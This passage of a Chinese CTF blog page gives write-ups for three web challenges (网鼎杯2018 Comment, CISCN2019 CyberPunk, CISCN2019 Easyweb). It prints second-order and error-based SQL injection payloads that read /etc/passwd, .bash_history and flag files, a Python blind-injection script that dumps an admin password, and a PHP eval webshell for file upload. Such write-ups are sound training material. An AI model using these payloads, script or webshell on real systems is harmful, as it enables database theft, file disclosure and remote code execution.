class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>类似刚做过的<strong>CyberPunk</strong>，对输入做了转义，然而<code>$category = mysql_fetch_array($result)[&#39;category&#39;];</code>却直接抓取了结果，也就是说，存在二次注入。</p>
-<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
-
-<p>这里即是关键的注入点，content会取出未转义的单引号进行闭合</p>
-<p>关键是如何构造，这是十分关键的</p>
-<blockquote>
-<p>注意：这里的content是commend的content，不是帖子的content</p>
-</blockquote>
-<p>这里的sql语句是多行的，注释需要用多行注释：</p>
-<p>令category=’,content=database(),/<em>，在留言中输入\</em>/#：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;&#x27;,content=database(),/*&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;*/#&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
-
-<p>这样构造，<code>/**/</code>注释掉跨行<code>&#39;</code>，#注释掉后面的单引号，content就会成功被我们劫持，我们在留言后语句就会成功执行完成注入。</p>
-<p>但是注库名时发现没有回显，一番尝试……放弃……</p>
-<p>load_file读取passwd：</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/songxingzhu/p/6364700.html">https://www.cnblogs.com/songxingzhu/p/6364700.html</a></p>
-</blockquote>
-<img src="/images/网鼎杯-2018-Comment/image-20210424155009903.png" alt="image-20210424155009903" style="zoom:80%;" />
-
-<p>最下面有一个www用户，目录为/home/www，默认shell为bin/bash，由此可以查一下该用户的shell历史：</p>
-<h4 id="bash-history"><a href="#bash-history" class="headerlink" title=".bash_history"></a>.bash_history</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011479200/article/details/86501366">https://blog.csdn.net/u011479200/article/details/86501366</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/chinalinuxzend/article/details/1849419">命令记录.bash_history</a></p>
-<p>查下/home/www/下的命令使用历史：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/ </span><br><span class="line">unzip html.zip </span><br><span class="line">rm -f html.zip </span><br><span class="line">cp -r html /var/www/ </span><br><span class="line"><span class="built_in">cd</span> /var/www/html/ </span><br><span class="line">rm -f .DS_Store </span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
-
-<p>.DS_Store似乎是一种泄露，在网页上线前删掉了，但是/tmp/html中应该是存在的：</p>
-<p>读取发现是乱码且显示不完整，用hex()读取：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bud1</span><br><span class="line">strapIl	bootstrapIlocblobF(������comment.phpIlocblob�(��cssIlocblobR(������flag_8946e1ff1ee3e40f.phpIlocblob�(������fontsIlocblobF�������	index.phpIlocblob����jsIlocblobR�������	login.phpIlocblob��������	mysql.phpIlocblobF������vendorIlocblob�������write_do.phpIlocblobR������ @� @� @� @E</span><br></pre></td></tr></table></figure>
-
-<p>发现flag_8946e1ff1ee3e40f.php，可以着手读flag了……</p>
-<p>我寻思哪个目录下的flag文件应该都一样，结果不一样，必须读/var/www/html/下面的……</p>
-<p><code>category=&#39;,content=hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)),/*</code></p>
-<p>获得flag……</p>
-<img src="/images/网鼎杯-2018-Comment/image-20210424160546854.png" alt="image-20210424160546854" style="zoom:50%;" />
-
-<p>……tql</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/23/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/23/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/" class="post-title-link" itemprop="url">CISCN2019-华北赛区-Day1-Web5-CyberPunk</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-04-23 17:44:59 / 修改时间：19:08:00" itemprop="dateCreated datePublished" datetime="2021-04-23T17:44:59+08:00">2021-04-23</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h3><img src="/images/CISCN2019-华北赛区-Day1-Web5-CyberPunk/image-20210423174538565.png" alt="image-20210423174538565" style="zoom:40%;" />
-
-<p>摸索一下，有添加订单，查找订单，删除订单，确认订单，更改订单的功能：</p>
-<p>index、confirm、delete、search、change、config</p>
-<p>index页面有提示：?file，用php://读取：</p>
-<p>index.php：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--?file=?--&gt;</span><br></pre></td></tr></table></figure>
-
-<p>其他页面都有针对sql的过滤：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>我们可以发现，address(地址)没有过滤……</p>
-<p>在添加订单功能中（confirm.php）：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$re-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, $user_name, $address, $phone);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>bind_param：</p>
-<p>该函数绑定了 SQL 的参数，且告诉数据库参数的值。 “sss” 参数列处理其余参数的数据类型。s 字符告诉数据库该参数为字符串。</p>
-<p>参数有以下四种类型:</p>
-<p>i - integer（整型）<br>d - double（双精度浮点型）<br>s - string（字符串）<br>b - BLOB（布尔值）</p>
-</blockquote>
-<p>这个函数的使用绑定了参数为字符串，有效防止了sql注入……</p>
-<p>change.php：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>$address = addslashes($_POST[&quot;address&quot;]);</code>对修改值进行了转义操作……</p>
-<p>由于报错信息是可以打印出来的，是一个新的知识点：</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><a target="_blank" rel="noopener" href="https://blkstone.github.io/2017/11/09/updatexml-sqli/">https://blkstone.github.io/2017/11/09/updatexml-sqli/</a></p>
-<p>利用updatexml的中间不合语法的参数报错带出数据</p>
-<p>至于二次注入，很多wp都没解释……我猜测一波……</p>
-<p>在更新数据时，虽然对修改值进行了转义操作，但不会将<code>\</code>带入数据库，拿出时仍是<code>&#39;</code>。</p>
-<p><code>$row = $fetch-&gt;fetch_assoc();</code>抓取的是上一次的数据</p>
-<p>“‘, `old_address`=’”.$row[‘address’]是上一次的address，这使得 <strong>‘</strong> 依然起效……</p>
-<p>我们先注入报错语句，再在change随便更改下，上次注入语句便开始工作，获得报错内容，带出数据。</p>
-<p>构造语句使符合语法进行报错注入：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span><br><span class="line"></span><br><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e),1)#</span><br><span class="line"></span><br><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;0x75736572)),20,30),0x7e),1)#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>查了一大波东西，似乎没有flag……?</p>
-<p>原题目好像告诉了要读根目录的flag.txt……</p>
-<p><code>address=1&#39; where user_id=updatexml(1,concat(0x7e,substr(load_file(&#39;/flag.txt&#39;),1,20),0x7e),1)#</code></p>
-<img src="/images/CISCN2019-华北赛区-Day1-Web5-CyberPunk/image-20210423190458532.png" alt="image-20210423190458532" style="zoom:80%;" />
-
-<p><code>address=1&#39; where user_id=updatexml(1,concat(0x7e,substr(load_file(&#39;/flag.txt&#39;),20,60),0x7e),1)#</code></p>
-<p>flag{db0fd1ea-0731-4</p>
-<p>b94-ad41-e7e6192643eb}</p>
-<p>得到了flag……</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/23/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/23/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/" class="post-title-link" itemprop="url">CISCN2019-总决赛-Day2-Web1-Easyweb</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-04-23 10:56:01 / 修改时间：22:38:19" itemprop="dateCreated datePublished" datetime="2021-04-23T10:56:01+08:00">2021-04-23</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h3><p>进入题目是一个登录界面：</p>
-<img src="/images/CISCN2019-总决赛-Day2-Web1-Easyweb/image-20210423105739857.png" alt="image-20210423105739857" style="zoom:40%;" />
-
-<p>其中每次登录猫猫的图片会发生变化</p>
-<p>查看robots.txt有所发现：</p>
-<p><code>User-agent: * Disallow: *.php.bak</code></p>
-<p>说明存在以.php.bak结尾的源码备份……但尝试一下发现不是index，也不是users……难道要爆破……</p>
-<p>查看源码发现：</p>
-<p><code>&lt;div class=&quot;avtar&quot;&gt;&lt;img src=&quot;image.php?id=2&quot; width=&quot;200&quot; height=&quot;200&quot;/&gt;&lt;/div&gt;</code></p>
-<p>存在image.php……</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">&quot;id&quot;</span>])?$_GET[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">&quot;path&quot;</span>])?$_GET[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">&quot;./&quot;</span> . $row[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>PHP addslashes() 函数</p>
-<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
-<p>预定义字符是：</p>
-<ul>
-<li>单引号（’）</li>
-<li>双引号（”）</li>
-<li>反斜杠（\）</li>
-<li>NULL</li>
-</ul>
-</blockquote>
-<p><code>&#39;</code>会被转义掉，但配合str_replace就可以产生一些奇妙的变化</p>
-<p><code>?id=\0</code>：<img src="/images/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/image-20210423115233354.png" alt="image-20210423115233354"></p>
-<p>这样就可以传入一个转义符号，类似Hgame2021的jali，转义掉一个<code>&#39;</code>，注释掉一个<code>&#39;</code>来注入</p>
-<p><code>?id=\\0&amp;path=or 1=1%23</code>即为：</p>
-<p><code>select * from images where id=&#39;\&#39; or path=&#39;or 1=1#&#39;</code>=&gt;</p>
-<p> =&gt; select * from images where id=’<u><strong><em>\‘ or path=’</em></strong></u>or 1=1#’               </p>
-<p> =&gt; select * from images where id=’xxx’or 1=1#’</p>
-<p>脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">url1 = <span class="string">&quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\0&amp;path=or if(ord(substr(database(),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment"># 库名</span></span><br><span class="line">url2 = <span class="string">&quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\0&amp;path=or &quot;</span> \</span><br><span class="line">       <span class="string">&quot;if(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment"># 表名</span></span><br><span class="line">url3 = <span class="string">&quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\0&amp;path=or &quot;</span> \</span><br><span class="line">       <span class="string">&quot;if(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x7573657273)),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment"># 列名，因为不能用单引号，使用16进制代替。</span></span><br><span class="line">url4 = <span class="string">&quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\0&amp;path=or &quot;</span> \</span><br><span class="line">       <span class="string">&quot;if(ord(substr((select(password)from(users)),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment"># 数据</span></span><br><span class="line">url = url4</span><br><span class="line"><span class="comment"># 选择查询语句</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> r &gt; l:</span><br><span class="line">        mid = <span class="built_in">int</span>((l + r + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        x = <span class="built_in">str</span>(x)</span><br><span class="line">        y = <span class="built_in">str</span>(mid)</span><br><span class="line">        pay = url.<span class="built_in">format</span>(x, y)</span><br><span class="line">        response = requests.get(url=pay)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid - <span class="number">1</span></span><br><span class="line">        <span class="comment"># time.sleep(0.03)</span></span><br><span class="line">    flag += (<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">    print(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>查询结果：    </p>
-<p>库：ciscnfinal</p>
-<p>表：images：id,path</p>
-<p>​        users：   username：admin<br>​                         password ：e957ea7cd1b7147600b8</p>
-<p>找到了admin的账号与密码，登录：</p>
-<img src="/images/CISCN2019-总决赛-Day2-Web1-Easyweb/image-20210423120317916.png" alt="image-20210423120317916" style="zoom:80%;" />
-
-<p>user.php是一个上传点……</p>
-<p>上传后会生成提交记录，记录了上传文件名</p>
-<p>e.g：/logs/upload.6274dd38c24268134ba3baabf7c82f0d.log.php</p>
-<img src="/images/CISCN2019-总决赛-Day2-Web1-Easyweb/image-20210423120733203.png" alt="image-20210423120733203" style="zoom:80%;" />
-
-<p>上传过滤了php……可以使用短标签：<code>&lt;?=eval($_GET[&#39;a&#39;])?&gt;</code></p>
-<p>测试一下：</p>
-<p>?a=echo 1;</p>
